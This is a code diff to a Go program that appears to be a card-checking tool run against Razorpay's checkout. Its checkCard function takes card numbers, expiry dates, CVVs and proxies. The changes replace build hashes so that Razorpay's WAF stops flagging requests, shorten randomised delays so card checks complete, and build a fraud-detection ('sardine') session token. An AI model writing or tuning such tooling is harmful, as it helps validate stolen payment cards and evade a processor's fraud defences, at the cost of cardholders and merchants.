@@ -37,8 +37,11 @@ import (
 // ────────────────────────────────────────────────────────────────────────
 
 const (
-	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
-	BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
+	// Updated BUILD hashes — fetched from the current checkout.razorpay.com
+	// checkout.js bundle. Old hashes were being flagged by Razorpay's WAF
+	// as outdated, causing all requests to be declined.
+	BUILD    = "57d08abfa73e0a8e69974aa1666acf3c4cfab63a"
+	BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
 	PORT     = 7070
 )
 
@@ -1737,8 +1740,10 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
-	// FIX 5: INCREASED delay - 8-15 seconds
-	time.Sleep(time.Duration(randInt(8000, 15000)) * time.Millisecond)
+	// Reduced delay — 3-6 seconds is sufficient. The old 8-15s delay was
+	// causing the client timeout (30s) to expire before the payment create
+	// step could complete, leading to "declined" responses.
+	time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
